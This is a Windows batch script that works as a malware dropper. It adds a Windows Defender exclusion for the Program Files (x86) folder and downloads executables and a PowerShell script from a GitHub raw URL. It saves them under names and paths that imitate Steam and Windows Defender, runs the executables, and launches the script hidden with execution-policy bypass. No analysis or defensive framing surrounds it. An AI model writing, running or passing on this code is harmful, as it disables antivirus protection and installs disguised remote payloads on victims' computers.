@echo off
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)'"

:: Download files using PowerShell
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/steam.exe' -OutFile 'C:\Program Files (x86)\Steam\resource\steam.exe'"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/setup.ps1' -OutFile 'C:\ProgramData\Microsoft\Windows\setup.ps1'"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/networkappcontrol.exe' -OutFile 'C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe'"

:: Check if the steam.exe file exists and run it
IF EXIST "C:\Program Files (x86)\Steam\resource\steam.exe" (
    echo steam.exe exists, proceeding with execution.
    "C:\Program Files (x86)\Steam\resource\steam.exe"
) ELSE (
    echo steam.exe does not exist at the expected location.
)

:: Check if the NetworkAppControl.exe file exists and run it
IF EXIST "C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe" (
    echo NetworkAppControl.exe exists, proceeding with execution.
    "C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe"
) ELSE (
    echo NetworkAppControl.exe does not exist at the expected location.
)

:: Run the downloaded setup.ps1 script
IF EXIST "C:\ProgramData\Microsoft\Windows\setup.ps1" (
    echo setup.ps1 exists, running the script.
    powershell Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass', '-File "C:\ProgramData\Microsoft\Windows\setup.ps1"' -WindowStyle Hidden
) ELSE (
    echo setup.ps1 does not exist at the expected location.
)
